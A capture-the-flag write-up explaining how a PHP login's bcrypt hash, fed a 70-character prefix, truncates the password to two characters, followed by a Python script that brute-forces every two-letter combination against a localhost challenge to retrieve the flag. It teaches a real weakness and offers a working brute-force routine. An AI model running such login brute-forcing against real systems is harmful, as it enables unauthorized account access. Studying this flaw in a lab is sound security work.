1. Looking at the source code, it is revealed that the hash is generated with these three components:

- username, `admin` (length of 5)
- random string, `an_additional_random_string_to_leengthen_the_hash_for_some_reason` (length of 65)
- and password (variable length)

2. Furthermore, the hash uses the BCRYPT algorithm. On the official [PHP Documentation](https://www.php.net/manual/en/function.password-hash.php), we see that the BCRYPT algorithm truncates its input when generating the hash

   > Caution Using the PASSWORD_BCRYPT as the algorithm, will result in the password parameter being truncated to a maximum length of 72 bytes.
   > Since the first 2 components of the input 70 chars, only the first 2 characters of the entered password will be considered. This means that bruteforce is possible.

3. Solve script is as provided:

```python
import requests as r
import string

TARGET = "http://localhost:1337/?username=admin&password={}"
charset = string.ascii_letters

for i in charset:
    for j in charset:
        payload = TARGET.format(i+j)
        print(f"Trying {payload}")
        res = r.get(payload)

        if "CSS{" in res.text:
            print(res.text)
            exit()
```
